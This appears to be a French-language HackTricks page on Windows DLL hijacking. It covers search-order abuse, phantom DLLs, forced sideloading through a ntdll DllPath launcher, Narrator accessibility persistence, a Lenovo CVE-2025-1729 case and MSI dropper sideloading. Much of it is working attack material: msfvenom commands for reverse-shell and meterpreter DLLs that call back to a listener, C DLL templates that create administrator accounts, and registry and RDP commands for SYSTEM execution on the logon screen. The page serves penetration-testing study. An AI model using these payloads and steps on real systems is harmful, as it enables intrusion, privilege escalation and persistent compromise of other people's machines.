# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Informations de base

DLL Hijacking consiste à manipuler une application de confiance pour qu'elle charge une DLL malveillante. Ce terme englobe plusieurs tactiques comme **DLL Spoofing, Injection, and Side-Loading**. Il est principalement utilisé pour le code execution, obtenir de la persistence et, moins fréquemment, pour le privilege escalation. Bien que l'accent soit mis ici sur l'escalade, la méthode de hijacking reste la même selon les objectifs.

### Techniques courantes

Plusieurs méthodes sont employées pour le DLL hijacking, chacune étant plus ou moins efficace selon la stratégie de chargement de DLL de l'application :

1. **DLL Replacement**: Remplacer une DLL légitime par une DLL malveillante, éventuellement en utilisant DLL Proxying pour préserver la fonctionnalité de la DLL originale.
2. **DLL Search Order Hijacking**: Placer la DLL malveillante dans un chemin de recherche avant celui de la DLL légitime, en exploitant le schéma de recherche de l'application.
3. **Phantom DLL Hijacking**: Créer une DLL malveillante que l'application tentera de charger en pensant qu'il s'agit d'une DLL requise inexistante.
4. **DLL Redirection**: Modifier des paramètres de recherche comme %PATH% ou les fichiers .exe.manifest / .exe.local pour diriger l'application vers la DLL malveillante.
5. **WinSxS DLL Replacement**: Substituer la DLL légitime par une version malveillante dans le répertoire WinSxS, méthode souvent associée à la DLL side-loading.
6. **Relative Path DLL Hijacking**: Placer la DLL malveillante dans un répertoire contrôlé par l'utilisateur avec l'application copiée, ressemblant aux techniques Binary Proxy Execution.

> [!TIP]
> For a step-by-step chain that layers HTML staging, AES-CTR configs, and .NET implants on top of DLL sideloading, review the workflow below.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Trouver des Dlls manquantes

La façon la plus courante de trouver des Dlls manquantes sur un système est d'exécuter [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) de sysinternals, en **configurant** les **2 filtres suivants** :

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

et d'afficher uniquement l'Activité du système de fichiers :

![](<../../../images/image (153).png>)

Si vous recherchez des **dlls manquantes en général**, laissez ceci tourner pendant quelques **secondes**.\
Si vous recherchez une **dll manquante dans un exécutable spécifique**, vous devez ajouter un **autre filtre** comme "Process Name" "contains" `<exec name>`, exécuter l'exécutable, puis arrêter la capture des événements.

## Exploiter des Dlls manquantes

Pour escalate privileges, la meilleure opportunité est de pouvoir **écrire une DLL** qu'un processus privilégié tentera de charger dans un des **emplacements où elle sera recherchée**. Ainsi, nous pourrons soit **écrire** une DLL dans un **dossier** où la DLL est recherchée avant le dossier contenant la **DLL originale** (cas particulier), soit écrire dans un dossier où la DLL est recherchée et où la DLL originale n'existe dans aucun dossier.

### Dll Search Order

**Dans la** [**documentation Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **vous pouvez trouver comment les Dlls sont chargées précisément.**

Les applications Windows recherchent les DLLs en suivant un ensemble de **chemins de recherche prédéfinis**, respectant une séquence particulière. Le problème du DLL hijacking survient lorsqu'une DLL malveillante est placée stratégiquement dans l'un de ces répertoires, s'assurant qu'elle est chargée avant la DLL authentique. Une solution pour éviter cela est de s'assurer que l'application utilise des chemins absolus lorsqu'elle référence les DLLs dont elle a besoin.

Vous pouvez voir ci-dessous l'**ordre de recherche des DLL** sur les systèmes 32-bit :

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Ceci est l'ordre de recherche **par défaut** avec **SafeDllSearchMode** activé. Lorsqu'il est désactivé, le répertoire courant passe en deuxième position. Pour désactiver cette fonctionnalité, créez la valeur de registre **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** et définissez-la à 0 (par défaut activé).

Si la fonction [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) est appelée avec **LOAD_WITH_ALTERED_SEARCH_PATH**, la recherche commence dans le répertoire du module exécutable que **LoadLibraryEx** est en train de charger.

Enfin, notez qu'**une dll peut être chargée en indiquant le chemin absolu au lieu du simple nom**. Dans ce cas, cette dll ne sera **recherchée que dans ce chemin** (si la dll a des dépendances, elles seront recherchées comme si la dll venait d'être chargée par nom).

Il existe d'autres moyens d'altérer l'ordre de recherche mais je ne vais pas les expliquer ici.

### Forcer le sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Une façon avancée d'influencer de manière déterministe le chemin de recherche des DLL d'un processus nouvellement créé est de définir le champ DllPath dans RTL_USER_PROCESS_PARAMETERS lors de la création du processus avec les API natives de ntdll. En fournissant ici un répertoire contrôlé par l'attaquant, un processus cible qui résout une DLL importée par nom (sans chemin absolu et sans utiliser les flags de chargement sécurisés) peut être forcé à charger une DLL malveillante depuis ce répertoire.

Idée clé
- Construire les paramètres du processus avec RtlCreateProcessParametersEx et fournir un DllPath personnalisé pointant vers votre dossier contrôlé (par ex. le répertoire où vit votre dropper/unpacker).
- Créer le processus avec RtlCreateUserProcess. Lorsque le binaire cible résoudra une DLL par nom, le loader consultera ce DllPath fourni durant la résolution, permettant un sideloading fiable même lorsque la DLL malveillante n'est pas colocée avec l'EXE cible.

Remarques/limitations
- Cela affecte le processus enfant créé ; c'est différent de SetDllDirectory, qui n'affecte que le processus courant.
- La cible doit importer ou appeler LoadLibrary sur une DLL par nom (pas de chemin absolu et sans utiliser LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs et chemins absolus codés en dur ne peuvent pas être hijackés. Les exports forwardés et SxS peuvent modifier la priorité.

Exemple C minimal (ntdll, wide strings, gestion d'erreurs simplifiée):

<details>
<summary>Exemple C complet : forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operational usage example
- Place a malicious xmllite.dll (exporting the required functions or proxying to the real one) in your DllPath directory.
- Launch a signed binary known to look up xmllite.dll by name using the above technique. The loader resolves the import via the supplied DllPath and sideloads your DLL.

This technique has been observed in-the-wild to drive multi-stage sideloading chains: an initial launcher drops a helper DLL, which then spawns a Microsoft-signed, hijackable binary with a custom DllPath to force loading of the attacker’s DLL from a staging directory.


#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifeste before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Escalating Privileges

**Requirements**:

- Identify a process that operates or will operate under **different privileges** (horizontal or lateral movement), which is **lacking a DLL**.
- Ensure **write access** is available for any **directory** in which the **DLL** will be **searched for**. This location might be the directory of the executable or a directory within the system path.

Oui, les prérequis sont difficiles à trouver car **par défaut c’est assez rare de trouver un exécutable privilégié qui n’a pas une DLL** et c’est encore **plus étrange d’avoir des permissions d’écriture sur un dossier du system path** (ce n’est pas possible par défaut). Mais, dans des environnements mal configurés, cela peut arriver.\
Dans le cas où vous avez de la chance et que vous remplissez les conditions, vous pouvez consulter le projet [UACME](https://github.com/hfiref0x/UACME). Même si le **but principal du projet est de bypass UAC**, vous pourriez y trouver un **PoC** d’un Dll hijaking pour la version de Windows qui vous intéresse et que vous pouvez utiliser (probablement en changeant juste le chemin du dossier où vous avez des droits d’écriture).

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Et **vérifiez les permissions de tous les dossiers contenus dans PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Vous pouvez aussi vérifier les imports d'un exécutable et les exports d'une dll avec :
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Pour un guide complet sur comment **abuser Dll Hijacking pour escalader les privilèges** avec des permissions d'écriture dans un **System Path folder** consultez :


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Outils automatisés

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) vérifiera si vous avez des permissions d'écriture sur un dossier à l'intérieur du system PATH.\
D'autres outils automatisés intéressants pour découvrir cette vulnérabilité sont les **fonctions PowerSploit** : _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ et _Write-HijackDll._

### Exemple

Si vous trouvez un scénario exploitable, l'une des choses les plus importantes pour l'exploiter avec succès sera de **créer une dll qui exporte au minimum toutes les fonctions que l'exécutable importera d'elle**. Quoi qu'il en soit, notez que Dll Hijacking est utile pour [escalader du niveau d'intégrité Medium vers High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ou de[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Vous pouvez trouver un exemple de **how to create a valid dll** dans cette étude sur le dll hijacking axée sur le hijacking de dll pour l'exécution : [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
De plus, dans la **prochaine sectio**n vous pouvez trouver des **codes dll basiques** qui pourraient être utiles comme **templates** ou pour créer une **dll exportant des fonctions non requises**.

## **Création et compilation de Dlls**

### **Dll Proxifying**

Essentiellement un **Dll proxy** est une Dll capable de **exécuter votre code malveillant lorsqu'elle est chargée** mais aussi d'**exposer** et de **fonctionner** comme prévu en **relayant tous les appels vers la librairie réelle**.

Avec l'outil [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ou [**Spartacus**](https://github.com/Accenture/Spartacus) vous pouvez en fait **indiquer un exécutable et sélectionner la bibliothèque** que vous voulez proxifier et **générer une dll proxifiée** ou **indiquer la Dll** et **générer une dll proxifiée**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Obtenir un meterpreter (x86) :**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Créer un utilisateur (x86, je n'ai pas vu de version x64) :**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Votre propre

Notez que dans plusieurs cas, la Dll que vous compilez doit **exporter plusieurs fonctions** qui vont être chargées par le processus victime ; si ces fonctions n'existent pas, le **binaire ne pourra pas les charger** et l'**exploit échouera**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Exemple de DLL C++ avec création d'un utilisateur</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>DLL C alternative avec point d'entrée de thread</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Étude de cas : Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe continue de vérifier, au démarrage, une DLL de localisation prévisible et spécifique à la langue, qui peut être détournée pour permettre l'exécution de code arbitraire et assurer la persistance.

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. No exports are required.

Discovery with Procmon
- Filtre : `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Démarrez Narrator et observez la tentative de chargement du chemin ci‑dessus.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- Une prise de contrôle naïve fera parler/mettre en surbrillance l'interface utilisateur. Pour rester discret, lors de l'attachement, énumérez les threads de Narrator, ouvrez le thread principal (`OpenThread(THREAD_SUSPEND_RESUME)`) et `SuspendThread` ; poursuivez dans votre propre thread. Voir PoC pour le code complet.

Trigger and persistence via Accessibility configuration
- Contexte utilisateur (HKCU) : `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM) : `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Avec ce qui précède, le lancement de Narrator charge la DLL implantée. Sur le bureau sécurisé (écran de connexion), appuyez sur CTRL+WIN+ENTER pour démarrer Narrator.

RDP-triggered SYSTEM execution (lateral movement)
- Autoriser la couche de sécurité RDP classique : `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP vers l'hôte, à l'écran de connexion appuyez sur CTRL+WIN+ENTER pour lancer Narrator ; votre DLL s'exécute en tant que SYSTEM sur le bureau sécurisé.
- L'exécution s'arrête lorsque la session RDP se ferme — injectez/migrez rapidement.

Bring Your Own Accessibility (BYOA)
- Vous pouvez cloner une entrée de registre d'un Accessibility Tool intégré (AT) (p. ex., CursorIndicator), la modifier pour qu'elle pointe vers un binaire/DLL arbitraire, l'importer, puis définir `configuration` sur ce nom d'AT. Cela proxifie l'exécution arbitraire via le framework Accessibility.

Remarques
- Écrire sous `%windir%\System32` et modifier des valeurs HKLM nécessite des droits admin.
- Toute la logique du payload peut résider dans `DLL_PROCESS_ATTACH` ; aucune exportation n'est nécessaire.

## Étude de cas : CVE-2025-1729 - Escalade de privilèges via TPQMAssistant.exe

Ce cas démontre **Phantom DLL Hijacking** dans le TrackPoint Quick Menu de Lenovo (`TPQMAssistant.exe`), identifié comme **CVE-2025-1729**.

### Détails de la vulnérabilité

- **Composant** : `TPQMAssistant.exe` situé à `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Tâche planifiée** : `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` s'exécute quotidiennement à 09:30 sous le contexte de l'utilisateur connecté.
- **Permissions du répertoire** : Écriture autorisée pour `CREATOR OWNER`, permettant aux utilisateurs locaux de déposer des fichiers arbitraires.
- **Comportement de recherche des DLL** : Tente de charger `hostfxr.dll` depuis son répertoire de travail en premier et logge "NAME NOT FOUND" si absent, indiquant une priorité de recherche dans le répertoire local.

### Implémentation de l'exploit

Un attaquant peut déposer un stub malveillant `hostfxr.dll` dans le même répertoire, exploitant l'absence de la DLL pour obtenir exécution de code dans le contexte de l'utilisateur :
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Flux d'attaque

1. En tant qu'utilisateur standard, déposer `hostfxr.dll` dans `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Attendre que la tâche planifiée s'exécute à 9:30 sous le contexte de l'utilisateur courant.
3. Si un administrateur est connecté lorsque la tâche s'exécute, la DLL malveillante s'exécute dans la session de l'administrateur au niveau d'intégrité medium.
4. Chainer des techniques standard de contournement UAC pour s'élever du niveau d'intégrité medium aux privilèges SYSTEM.

## Étude de cas : MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Les acteurs de menace associent souvent des droppers basés sur MSI avec du DLL side-loading pour exécuter des payloads sous un processus signé et de confiance.

Aperçu de la chaîne
- L'utilisateur télécharge un MSI. Une CustomAction s'exécute silencieusement pendant l'installation GUI (p.ex., LaunchApplication ou une action VBScript), reconstruisant l'étape suivante à partir de ressources embarquées.
- Le dropper écrit un EXE légitime et signé ainsi qu'une DLL malveillante dans le même répertoire (exemple de paire : Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Quand l'EXE signé est lancé, l'ordre de recherche de DLL de Windows charge wsc.dll depuis le répertoire de travail en premier, exécutant le code de l'attaquant sous un parent signé (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Cherchez des entrées qui exécutent des exécutables ou du VBScript. Exemple de pattern suspect : LaunchApplication exécutant un fichier embarqué en arrière-plan.
- Dans Orca (Microsoft Orca.exe), inspectez les tables CustomAction, InstallExecuteSequence et Binary.
- Payloads embarqués/splittés dans la CAB MSI:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Cherchez plusieurs petits fragments qui sont concaténés et décryptés par une CustomAction VBScript. Flux commun:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Sideloading pratique avec wsc_proxy.exe
- Déposez ces deux fichiers dans le même dossier :
- wsc_proxy.exe : hôte signé légitime (Avast). Le processus tente de charger wsc.dll par son nom depuis son répertoire.
- wsc.dll : DLL de l'attaquant. Si aucun export spécifique n'est requis, DllMain peut suffire ; sinon, construisez un proxy DLL et redirigez les exports requis vers la bibliothèque d'origine tout en exécutant le payload dans DllMain.
- Construisez un payload DLL minimal :
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Pour les besoins d'export, utilisez un framework de proxying (par ex. DLLirant/Spartacus) pour générer une forwarding DLL qui exécute également votre payload.

- Cette technique repose sur la résolution des noms de DLL par le binaire hôte. Si l'hôte utilise des chemins absolus ou des flags de chargement sûrs (par ex. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), le hijack peut échouer.
- KnownDLLs, SxS et les forwarded exports peuvent influencer la priorité et doivent être pris en compte lors du choix du binaire hôte et de l'ensemble des exports.

## Références

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)


{{#include ../../../banners/hacktricks-training.md}}
